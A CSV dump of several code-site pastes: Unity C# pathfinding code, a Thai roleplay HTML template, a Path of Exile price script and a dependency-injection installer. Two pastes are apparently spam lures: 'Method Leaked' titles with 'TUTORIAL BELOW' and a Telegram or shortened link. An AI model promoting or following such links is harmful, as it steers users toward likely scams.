id,title,username,language,date,content
DfaNcKk7,Untitled,shahilsaha,C#,Tuesday 22nd of July 2025 01:00:23 PM CDT,"public class AStar : BasePathfinding
{
    protected override PathResult FindPath(Node start, Node goal, HashSet<Node> allowedNodes = null)
    {
        List<Node> openList = new List<Node>();
        HashSet<Node> closedList = new HashSet<Node>();

        openList.Add(start);
        start.gCost = 0; // Cost of the start node is 0
        start.hCost = HeuristicHelper.GetManhattanDistance(start, goal); // Heuristic cost from start to end
        start.fCost = start.gCost + start.hCost; // Total cost of the path from start to end

        // while there are nodes in the open list
        while (openList.Count > 0)
        {
            // Get the current Node with the lowest fCost
            Node currentNode = HeuristicHelper.FindLowestF(openList);

            // if the node is there in the open list, move it to the closed list
            if (openList.Contains(currentNode))
                openList.Remove(currentNode);

            closedList.Add(currentNode);

            // if the goal node is the current node, retrace the path and return it
            if (currentNode == goal)
            {
                var (path, totalCost) = HeuristicHelper.RetracePath(start, goal);
                return new PathResult
                {
                    Path = path,
                    PathLength = path.Count,
                    PathCost = totalCost,
                };
            }

            // Else, get all the neighbors of the current node
            var neighbors = currentNode.GetNeighbors();

            // Loop through each neighbor
            foreach (var neighbor in neighbors)
            {
                // If the neighbor is already in the closed list or is blocked, skip it
                if (closedList.Contains(neighbor) || !HeuristicHelper.IsNodeAllowed(neighbor, allowedNodes))
                    continue;

                // Gets the distance from the current node to the neighbor
                float tentativeGCost =
                    currentNode.gCost + HeuristicHelper.GetManhattanDistance(currentNode, neighbor);

                // calculate the cost of the path to the neighbor
                if (tentativeGCost < neighbor.gCost || !openList.Contains(neighbor))
                {
                    neighbor.gCost = tentativeGCost;
                    neighbor.hCost = HeuristicHelper.GetManhattanDistance(neighbor, goal);
                    neighbor.fCost = neighbor.gCost + neighbor.hCost;
                    neighbor.parent = currentNode;

                    // Add it to the open list if it is not already there
                    if (!openList.Contains(neighbor))
                        openList.Add(neighbor);
                }
            }
        }

        // No path was found, return null
        return null;
    }
}
"
bmpGjKJa,Untitled,shahilsaha,C#,Tuesday 22nd of July 2025 12:40:59 PM CDT,"public class PathfindingEvaluator : MonoBehaviour
{
    [SerializeField] private Grid3D mGrid;
    [SerializeField] private PathfindingManager mPathManager;
    private List<EvaluationResult> evaluationResults = new List<EvaluationResult>();

    public List<EvaluationResult> GetEvaluationResults() => evaluationResults;

    public EvaluationResult Evaluate(int evalSize)
    {
        // Pre evaluation
        if (evalSize <= 0)
        {
            Debug.LogError(""Evaluation size must be greater than 0."");
            return null;
        }

        // -- Clear data if exists.
        ClearResults();

        var nodes = mGrid.GetStartEndNodes();

        // Evaluate the algorithms
        StartEvaluation(evalSize, nodes.start, nodes.goal);

        // Post evaluation
        if (evaluationResults.Count <= 0) return null;

        return evaluationResults[evalSize - 1];
    }

    public void ClearResults()
    {
        if (evaluationResults != null && evaluationResults.Count > 0)
            evaluationResults.Clear();
    }

    private void StartEvaluation(int evalSize, Node start, Node goal)
    {
        int count = 0;

        while (count < evalSize)
        {
            var results = GatherEvaluationData(start, goal);
            evaluationResults.Add(results);
            count++;
        }
    }

    private EvaluationResult GatherEvaluationData(Node start, Node goal)
    {
        var aStar = EvaluationResult.FromPathResult(mPathManager.RunAStar(start, goal));
        var ilsWithAStar = EvaluationResult.FromPathResult(mPathManager.RunILSWithAStar(start, goal));
        var gbfs = EvaluationResult.FromPathResult(mPathManager.RunGBFS(start, goal));
        var ilsWithGBFS = EvaluationResult.FromPathResult(mPathManager.RunILSWithGBFS(start, goal));

        return new EvaluationResult
        {
            AStar = aStar,
            ILSWithAStar = ilsWithAStar,
            GBFS = gbfs,
            ILSWithGBFS = ilsWithGBFS,
        };
    }
}"
NsffjKU7,?FREE Method Leaked? 1Y,awilsonsys,Java,Tuesday 22nd of July 2025 12:33:23 PM CDT," 
>TUTORIAL BELOW<
https://t[dot]me/+NWWm5d4mfEAyZDQx

B32hvM
"
ZShUhe42,Hadez Method Leaked???? TC,awilsonsys,Java,Tuesday 22nd of July 2025 12:30:11 PM CDT," 
>TUTORIAL BELOW<
https://tinyurl.com/2u65sthr

oBcAxz
"
ky1McsBH,Blossom 03 - โรล,Kelly-B9978,HTML,Tuesday 22nd of July 2025 12:27:17 PM CDT,"<!--
[คู่มือการแก้ไขโคด] 
ตำแหน่งภาพ : เพิ่ม --olv-pos: 50% 50%; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - เลขตัวแรกคือการขยับซ้าย - ขวา โดย 0% = ชิดซ้าย 100% = ชิดขวา
 - เลขตัวแรกคือการขยับขึ้น - ลง โดย 0% = ชิดบน 100% = ชิดล่าง
 
ขนาดภาพ : เพิ่ม --olv-size: cover; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - cover คือ ขยายเต็มพื้นที่
 - 100% คือ ขนาดเดิมของรูป
 - มากกว่า 100% คือ ขนาดใหญ่ขึ้น
 - น้อยกว่า 100% คือ ขนาดเล็กลง
-->

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Josephine  <br>    Starling</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Bellanie  <br>   Avendell</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Desdemona</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>"
YtitgPZA,poe pricecheck,Old_Shinigami,JavaScript,Tuesday 22nd of July 2025 12:23:00 PM CDT,"var Currency = [
[""Rogue's Marker"",27],
[""Scroll of Wisdom"",100],
[""Portal Scroll"",250],
[""Orb of Transmutation"",400],
[""Wild Crystallised Lifeforce"",414],
[""Jeweller's Orb"",440],
[""Primal Crystallised Lifeforce"",488],
[""Vivid Crystallised Lifeforce"",500],
[""Lesser Eldritch Ichor"",800],
[""Orb of Alchemy"",1000],
[""Orb of Binding"",1100],
[""Blacksmith's Whetstone"",1250],
[""Chromatic Orb"",1300],
[""Engineer's Orb"",1430],
[""Orb of Chance"",1500],
[""Instilling Orb"",1667],
[""Orb of Augmentation"",1700],
[""Orb of Fusing"",1760],
[""Orb of Alteration"",2000],
[""Lesser Eldritch Ember"",2200],
[""Armourer's Scrap"",2500],
[""Orb of Horizons"",4000],
[""Orb of Unmaking"",4700],
[""Blessed Orb"",5000],
[""Vaal Orb"",5500],
[""Greater Eldritch Ichor"",6000],
[""Glassblower's Bauble"",6500],
[""Orb of Scouring"",7000],
[""Tainted Blacksmith's Whetstone"",7400],
[""Regal Orb"",8000],
[""Tainter Jeweller's Orb"",8500],
[""Cartographer's Chisel"",9000],
[""Chaos Orb"",10000],
[""Orb of Regret"",11250],
[""Tainted Armourer's Scrap"",15000],
[""Enkindling Orb"",16000],
[""Greater Eldritch Ember"",17000],
[""Gemcutter's Prism"",20000],
[""Tainted Chromatic Orb"",21000],
[""Harbinger's Orb"",27500],
[""Stacked Deck"",30000],
[""Grand Eldritch Ichor"",36000],
[""Orb of Annulment"",55000],
[""Tainted Mythic Orb"",66600],
[""Tainted Orb of Fusing"",70000],
[""Tainted Chaos Orb"",73300],
[""Ancient Orb"",80000],
[""Grand Eldritch Ember"",136700],
[""Exalted Orb"",200000],
[""Eldritch Exalted Orb"",310000],
[""Maven's Chisel of Scarabs"",320000],
[""Maven's Chisel of Procurement"",330000],
[""Maven's Chisel of Divination"",430000],
[""Sacred Orb"",450000],
[""Eldritch Orb of Annulment"",460000],
[""Velied Chaos Orb"",500000],
[""Eldritch Chaos Orb"",580000],
[""Maven's Chisel of Proliferation"",660000],
[""Maven's Chisel of Avarice"",1150000],
[""Sacred Crystallised Lifeforce"",1280000],
[""Tainted Exalted Orb"",1700000],
[""Divine Orb"",2050000],
[""Exceptional Eldritch Ichor"",2200000],
[""Tempering Orb"",2270000],
[""Exceptional Eldritch Ember"",2790000],
[""Redeemer's Exalted Orb"",4100000],
[""Orb of Conflict"",4300000],
[""Warlord's Exalted Orb"",4510000],
[""Tailoring Orb"",5130000],
[""Hunter's Exalted Orb"",6150000],
[""Crusader's Exalted Orb"",6970000],
[""Awakener's Orb"",9640000],
[""Fracturing Orb"",14350000],
[""Orb of Dominance"",15170000],
[""Tainted Divine Teardrop"",15370000],
[""Velied Exalted Orb"",61500000],
[""Reflecting Mist"",65600000],
[""Hinekora's Lock"",348500000],
[""Mirror of Kalandra"",2255000000]], priceRange = [
[1e3,1e4,3,0,9],
[1e4,1e5,10,0,32],
[1e5,1e6,25,0,46],
[1e6,1e7,56,0,57],
[1e7,1e8,87,10,71],
[1e8,1e9,102,33,76],
[3e9,1e10,109,47,78],
[1e10,1e11,112,58,78]];
var r = Math.floor(Math.random()*priceRange[priceRange.length-1][2]),tier = 0;
for (let i=0; i<priceRange.length-1; i++) if (r>=priceRange[i][2]) tier = i+1;
var curr = priceRange[tier][3]+Math.floor(Math.random()*(1+priceRange[tier][4]-priceRange[tier][3]));
var price = priceRange[tier][0]+Math.floor(Math.random()*(1+priceRange[tier][1]-priceRange[tier][0]));
price = Math.floor(price/Currency[curr][1]);
if (price>=1000) price = price.toString().split('').reverse().join('').replace(/(.{3})(?=.)/g,""$1."").split('').reverse().join('');
var s = price+""x ""+Currency[curr][0]; s"
HUS3XvXp,Untitled,Ethan_M,C#,Tuesday 22nd of July 2025 12:15:01 PM CDT,"using GamePlay;
using GamePlay.Entities;
using GamePlay.Factory;
using GamePlay.MapFeatures;
using Networking;
using Networking.Entities;
using UnityEngine;
using Reflex.Core;
using Services;
using UI;
namespace Infrastructure
{
	public class ProjectInstaller : MonoBehaviour, IInstaller
	{
		public void InstallBindings(ContainerBuilder containerBuilder)
		{
			containerBuilder.AddSingleton(typeof(AssetProvider), typeof(IAssetProvider));
			containerBuilder.AddSingleton(typeof(StaticDataService), typeof(IStaticDataService));
			containerBuilder.AddSingleton(typeof(JsonToFileStorageService), typeof(IStorageService));
			containerBuilder.AddSingleton(typeof(StandaloneInputService), typeof(IInputService));
			containerBuilder.AddSingleton(typeof(SceneLoader), typeof(SceneLoader));
			containerBuilder.AddSingleton(typeof(MapConfigureLoader), typeof(IMapConfigureLoader));
# if LOCAL_BUILD
			containerBuilder.AddSingleton(typeof(LocalAvatarLoader), typeof(IAvatarLoader));
#else
			containerBuilder.AddSingleton(typeof(SteamAvatarLoader), typeof(IAvatarLoader));
#endif
			BindFactories(containerBuilder);
		}

		private static void BindFactories(ContainerBuilder containerBuilder)
		{
			containerBuilder.AddSingleton(typeof(ParticleFactory), typeof(IParticleFactory));
			containerBuilder.AddSingleton(typeof(MeshFactory), typeof(IMeshFactory));
			containerBuilder.AddSingleton(typeof(UIFactory), typeof(IUIFactory));
			containerBuilder.AddSingleton(typeof(NetworkEntityFactory), typeof(IEntityFactory));
			containerBuilder.AddSingleton(typeof(InventoryFactory), typeof(IInventoryFactory));
			containerBuilder.AddSingleton(typeof(CharacterFactory), typeof(ICharacterFactory));
			containerBuilder.AddSingleton(typeof(NetworkingFactory), typeof(INetworkingFactory));
		}
	}
}"
